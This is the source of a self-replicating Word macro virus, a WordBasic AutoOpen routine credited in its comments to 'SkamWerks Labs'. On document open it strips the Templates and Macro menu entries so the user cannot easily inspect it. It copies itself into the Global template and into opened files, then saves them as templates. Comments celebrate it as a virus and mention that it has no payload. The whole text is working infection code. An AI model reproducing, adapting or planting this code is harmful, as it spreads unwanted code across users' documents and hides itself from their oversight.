   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        WordBasic.ToolsCustomizeMenus ResetAll:=1
        WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
        WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1

        Rem What? No Payload?  WUSSY! Fuck off Puff

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":AutoOpen"

        WordBasic.MacroCopy MacName$, "Global:AutoOpen"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo AutoOpenHandler
        MacName$ = FName$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:AutoOpen", MacName$
   AutoOpenHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!J

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub
